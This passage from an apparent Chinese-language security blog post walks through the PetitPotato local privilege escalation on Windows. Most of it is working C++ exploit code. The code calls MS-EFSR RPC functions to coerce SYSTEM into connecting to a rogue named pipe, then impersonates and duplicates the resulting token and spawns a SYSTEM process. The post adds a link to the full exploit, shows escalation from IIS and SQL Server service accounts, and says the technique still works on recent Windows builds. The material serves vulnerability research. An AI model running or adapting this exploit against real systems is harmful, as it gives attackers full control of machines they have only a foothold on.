    status = (RpcStatus == RPC_S_OK);
    return status;
}
```

（3）编写 `EfsRpcTrigger()` 函数，在该函数的内部将调用 MS-EFSR RPC 接口中的函数来打开命名管道 `\\localhost/pipe/petit\C$\wh0nqs.txt`，客户端会自动将连接的管道路径转换为 `\\\\.\\pipe\\petit\\pipe\\srvsvc`，也就是前面  `LaunchNamedPipeServer()` 函数创建的管道。并且，`EfsRpcTrigger()` 中包含了所有 MS-EFSR 接口中能够利用的函数，他们大都可以实现与 `EfsRpcOpenFileRaw()` 函数类似的效果。

```c++
void EfsRpcTrigger(RPC_BINDING_HANDLE hBinding, DWORD efsId)
{
    RpcTryExcept
    {
        // Invoke remote procedure here
        LPWSTR PipeFileName;
        long result;

        PipeFileName = (LPWSTR)LocalAlloc(LPTR, MAX_PATH * sizeof(WCHAR));
        StringCchPrintfW(PipeFileName, MAX_PATH, L"\\\\localhost/pipe/petit\\C$\\wh0nqs.txt");


        if (efsId == 0)
        {
            wprintf(L"[+] Invoking EfsRpcOpenFileRaw with target path: %ws.\r\n", PipeFileName);

            /*
             *  long EfsRpcOpenFileRaw(
             *      [in] handle_t hBinding,
             *      [out] PEXIMPORT_CONTEXT_HANDLE* hContext,
             *      [in, string] wchar_t* FileName,
             *      [in] long Flags
             *  );
             */

            PVOID hContext;
            result = EfsRpcOpenFileRaw(hBinding, &hContext, PipeFileName, 0);
        }

        if (efsId == 1)
        {
            wprintf(L"[+] Invoking EfsRpcEncryptFileSrv with target path: %ws.\r\n", PipeFileName);

            /*
             *  long EfsRpcEncryptFileSrv(
             *      [in] handle_t hBinding,
             *      [in, string] wchar_t* FileName
             *  );
            */

            result = EfsRpcEncryptFileSrv(hBinding, PipeFileName);
        }

        if (efsId == 2)
        {
            wprintf(L"[+] Invoking EfsRpcDecryptFileSrv with target path: %ws.\r\n", PipeFileName);

            /*
             *  long EfsRpcDecryptFileSrv(
             *      [in] handle_t hBinding,
             *      [in, string] wchar_t* FileName,
             *      [in] unsigned long OpenFlag
             *  );
             */

            result = EfsRpcDecryptFileSrv(hBinding, PipeFileName, 0);
        }

        if (efsId == 3)
        {
            wprintf(L"[+] Invoking EfsRpcQueryUsersOnFile with target path: %ws.\r\n", PipeFileName);

            /*
             *  DWORD EfsRpcQueryUsersOnFile(
             *      [in] handle_t hBinding,
             *      [in, string] wchar_t* FileName,
             *      [out] ENCRYPTION_CERTIFICATE_HASH_LIST * *Users
             *  );
             */

            ENCRYPTION_CERTIFICATE_HASH_LIST* Users;
            result = EfsRpcQueryUsersOnFile(hBinding, PipeFileName, &Users);
        }
        if (efsId == 4)
        {
            wprintf(L"[+] Invoking EfsRpcQueryRecoveryAgents with target path: %ws.\r\n", PipeFileName);

            /*
             *  DWORD EfsRpcQueryRecoveryAgents(
             *      [in] handle_t hBinding,
             *      [in, string] wchar_t* FileName,
             *      [out] ENCRYPTION_CERTIFICATE_HASH_LIST * *RecoveryAgents
             *  );
             */

            ENCRYPTION_CERTIFICATE_HASH_LIST* RecoveryAgents;
            result = EfsRpcQueryRecoveryAgents(hBinding, PipeFileName, &RecoveryAgents);
        }
        if (efsId == 5)    // error
        {
            wprintf(L"[+] Invoking EfsRpcRemoveUsersFromFile with target path: %ws.\r\n", PipeFileName);

            /*
             *  DWORD EfsRpcRemoveUsersFromFile(
             *      [in] handle_t hBinding,
             *      [in, string] wchar_t* FileName,
             *      [in] ENCRYPTION_CERTIFICATE_HASH_LIST* Users
             *  );
             */

            ENCRYPTION_CERTIFICATE_HASH_LIST Users;
            result = EfsRpcRemoveUsersFromFile(hBinding, PipeFileName, &Users);
        }
        if (efsId == 6)
        {
            wprintf(L"[+] Invoking EfsRpcAddUsersToFile with target path: %ws.\r\n", PipeFileName);

            /*
             *  DWORD EfsRpcAddUsersToFile(
             *      [in] handle_t hBinding,
             *      [in, string] wchar_t* FileName,
             *      [in] ENCRYPTION_CERTIFICATE_LIST * EncryptionCertificates
             *  );
             */

            ENCRYPTION_CERTIFICATE_LIST EncryptionCertificates;
            result = EfsRpcAddUsersToFile(hBinding, PipeFileName, &EncryptionCertificates);
        }
        if (efsId == 7)
        {
            wprintf(L"[+] Invoking EfsRpcFileKeyInfo with target path: %ws.\r\n", PipeFileName);

            /*
             *  DWORD EfsRpcFileKeyInfo(
             *      [in] handle_t hBinding,
             *      [in, string] wchar_t* FileName,
             *      [in] DWORD InfoClass,
             *      [out] EFS_RPC_BLOB** KeyInfo
             *  );
             */

            EFS_RPC_BLOB* KeyInfo;
            result = EfsRpcFileKeyInfo(hBinding, PipeFileName, 0, &KeyInfo);

        }
        if (efsId == 8)    // error
        {
            wprintf(L"[+] Invoking EfsRpcDuplicateEncryptionInfoFile with target path: %ws.\r\n", PipeFileName);

            /*
             *  DWORD EfsRpcDuplicateEncryptionInfoFile(
             *      [in] handle_t hBinding,
             *      [in, string] wchar_t* SrcFileName,
             *      [in, string] wchar_t* DestFileName,
             *      [in] DWORD dwCreationDisposition,
             *      [in] DWORD dwAttributes,
             *      [in, unique] EFS_RPC_BLOB* RelativeSD,
             *      [in] BOOL bInheritHandle
             *  );
             */

            EFS_RPC_BLOB RelativeSD;
            result = EfsRpcDuplicateEncryptionInfoFile(hBinding, PipeFileName, PipeFileName, 1, 0, &RelativeSD, FALSE);
        }

        if (efsId == 9)
        {
            wprintf(L"[+] Invoking EfsRpcAddUsersToFileEx with target path: %ws.\r\n", PipeFileName);

            /*
             *  DWORD EfsRpcAddUsersToFileEx(
             *      [in] handle_t hBinding,
             *      [in] DWORD dwFlags,
             *      [in, unique] EFS_RPC_BLOB* Reserved,
             *      [in, string] wchar_t* FileName,
             *      [in] ENCRYPTION_CERTIFICATE_LIST* EncryptionCertificates
             *  );
             */

            EFS_RPC_BLOB Reserved;
            ENCRYPTION_CERTIFICATE_LIST EncryptionCertificates;
            result = EfsRpcAddUsersToFileEx(hBinding, 0, &Reserved, PipeFileName, &EncryptionCertificates);
        }

        if (efsId == 10)    // error
        {
            wprintf(L"[+] Invoking EfsRpcFileKeyInfoEx with target path: %ws.\r\n", PipeFileName);

            /*
             *  DWORD EfsRpcFileKeyInfoEx(
             *      [in] handle_t hBinding,
             *      [in] DWORD dwFileKeyInfoFlags,
             *      [in, unique] EFS_RPC_BLOB* Reserved,
             *      [in, string] wchar_t* FileName,
             *      [in] DWORD InfoClass,
             *      [out] EFS_RPC_BLOB** KeyInfo
             *  );
             */

            EFS_RPC_BLOB Reserved;
            EFS_RPC_BLOB* KeyInfo;
            result = EfsRpcFileKeyInfoEx(hBinding, 0, &Reserved, PipeFileName, 0, &KeyInfo);
        }
        if (efsId == 11)    // error
        {
            wprintf(L"[+] Invoking EfsRpcGetEncryptedFileMetadata with target path: %ws.\r\n", PipeFileName);

            /*
             *  DWORD EfsRpcGetEncryptedFileMetadata(
             *      [in] handle_t hBinding,
             *      [in, string, ref] wchar_t* FileName,
             *      [out, ref] EFS_RPC_BLOB ** EfsStreamBlob
             *  );
             */

            EFS_RPC_BLOB* EfsStreamBlob;
            result = EfsRpcGetEncryptedFileMetadata(hBinding, PipeFileName, &EfsStreamBlob);
        }

        if (efsId == 12)    // error
        {
            wprintf(L"[+] Invoking EfsRpcSetEncryptedFileMetadata with target path: %ws.\r\n", PipeFileName);

            /*
             *  DWORD EfsRpcSetEncryptedFileMetadata(
             *      [in] handle_t hBinding,
             *      [in, string, ref] wchar_t* FileName,
             *      [in, unique] EFS_RPC_BLOB* OldEfsStreamBlob,
             *      [in, ref] EFS_RPC_BLOB* NewEfsStreamBlob,
             *      [in, unique] ENCRYPTED_FILE_METADATA_SIGNATURE* NewEfsSignature
             *  );
             */

            EFS_RPC_BLOB OldEfsStreamBlob;
            EFS_RPC_BLOB NewEfsStreamBlob;
            ENCRYPTED_FILE_METADATA_SIGNATURE NewEfsSignature;
            result = EfsRpcSetEncryptedFileMetadata(hBinding, PipeFileName, &OldEfsStreamBlob, &NewEfsStreamBlob, &NewEfsSignature);
        }

        LocalFree(PipeFileName);
    }
    RpcExcept(EXCEPTION_EXECUTE_HANDLER);
    {
        wprintf(L"Exception: %d - 0x%08x.\r\n", RpcExceptionCode(), RpcExceptionCode());
    }
    RpcEndExcept
    {
        RpcBindingFree(&hBinding);
    }
}
```

（4）当 `EfsRpcTrigger()` 函数连接至管道后，将调用 `GetSystem()` 函数窃取管道客户端的特权令牌，并在特权令牌的上下文中创建进程。最终，我们将获取 SYSTEM 权限。

```c++
void GetSystem(HANDLE hNamedPipe, LPWSTR lpCommandLine)
{
    STARTUPINFO si;
    PROCESS_INFORMATION pi;

    HANDLE hProcess;
    HANDLE hToken = NULL;
    HANDLE phNewToken = NULL;

    DWORD dwCreationFlags = 0;
    LPWSTR lpCurrentDirectory = NULL;
    LPVOID lpEnvironment = NULL;

    // clear a block of memory
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(&pi, sizeof(pi));

    if (ImpersonateNamedPipeClient(hNamedPipe))
    {
        printf("[+] ImpersonateNamedPipeClient OK.\n");
    }
    else
    {
        printf("[-] ImpersonateNamedPipeClient() Error: %i.\n", GetLastError());
        goto cleanup;
    }

    if (OpenThreadToken(GetCurrentThread(), TOKEN_ALL_ACCESS, FALSE, &hToken))
    {
        printf("[+] OpenThreadToken OK.\n");
    }
    else
    {
        printf("[-] OpenThreadToken() Error: %i.\n", GetLastError());
        goto cleanup;
    }

    if (DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &phNewToken))
    {
        printf("[+] DuplicateTokenEx OK.\n");
    }
    else
    {
        printf("[-] DupicateTokenEx() Error: %i.\n", GetLastError());
        goto cleanup;
    }

    dwCreationFlags = CREATE_UNICODE_ENVIRONMENT;
    dwCreationFlags |= g_bInteractWithConsole ? 0 : CREATE_NEW_CONSOLE;

    if (!(lpCurrentDirectory = (LPWSTR)malloc(MAX_PATH * sizeof(WCHAR))))
    {
        goto cleanup;
    }

    if (!GetSystemDirectory(lpCurrentDirectory, MAX_PATH))
    {
        printf("[-] GetSystemDirectory() Error: %i.\n", GetLastError());
        goto cleanup;
    }

    if (!CreateEnvironmentBlock(&lpEnvironment, phNewToken, FALSE))
    {
        printf("[-] CreateEnvironmentBlock() Error: %i.\n", GetLastError());
        goto cleanup;
    }

    if (CreateProcessAsUser(phNewToken, NULL, lpCommandLine, NULL, NULL, TRUE, dwCreationFlags, lpEnvironment, lpCurrentDirectory, &si, &pi))
    {
        printf("[+] CreateProcessAsUser OK.\n");
    }
    else if (GetLastError() != NULL)
    {   
        RevertToSelf();
        printf("[!] CreateProcessAsUser() failed, possibly due to missing privileges, retrying with CreateProcessWithTokenW().\n");
        
        if (CreateProcessWithTokenW(phNewToken, LOGON_WITH_PROFILE, NULL, lpCommandLine, dwCreationFlags, lpEnvironment, lpCurrentDirectory, &si, &pi))
        {
            printf("[+] CreateProcessWithTokenW OK.\n");
        }
        else
        {
            printf("[-] CreateProcessWithTokenW failed (%d).\n", GetLastError());
            goto cleanup;
        }
    }

    if (g_bInteractWithConsole)
    {
        fflush(stdout);
        WaitForSingleObject(pi.hProcess, INFINITE);
    }

cleanup:
    if (hToken)
        CloseHandle(hToken);
    if (phNewToken)
        CloseHandle(phNewToken);
    if (lpCurrentDirectory)
        free(lpCurrentDirectory);
    if (lpEnvironment)
        DestroyEnvironmentBlock(lpEnvironment);
    if (pi.hProcess)
        CloseHandle(pi.hProcess);
    if (pi.hThread)
        CloseHandle(pi.hThread);

    return;
}
```

完整的利用代码已经上传到了我的 Github 仓库：[PetitPotato](https://github.com/wh0Nsq/PetitPotato)，感兴趣的读者可以自行获取。下面我们分别通过 Administrator 和 Local Service 权限来演示最终的提权效果：

- Administrator —> SYSTEM

![](/assets/posts/2022-05-21-petitpotato-how-do-I-escalate-to-system-via-named-pipe/image-20220521003336219.png)

- Local Service (IIS) —> SYSTEM

![](/assets/posts/2022-05-21-petitpotato-how-do-I-escalate-to-system-via-named-pipe/image-20220521003520211.png)

- Local Service (SQL Server) —> SYSTEM

![](/assets/posts/2022-05-21-petitpotato-how-do-I-escalate-to-system-via-named-pipe/image-20220521010549799.png)

## Forced authentication still not entirely patched

Microsoft 针对 EFSRPC 强制身份验证已发布了一系列修补措施，但是强制身份验证仍未完全修补。截至目前（2023/03/15），通过为 EFSRPC 指定 RPC_C_AUTHN_LEVEL_PKT_PRIVACY 身份验证级别，我们可以在最新版的 Windows 系统（Windows 21H2 10.0.20348.1547）上成功提升至 SYSTEM 权限。

![image-20230315131532296](/assets/posts/2022-05-21-petitpotato-how-do-I-escalate-to-system-via-named-pipe/image-20230315131532296.png)
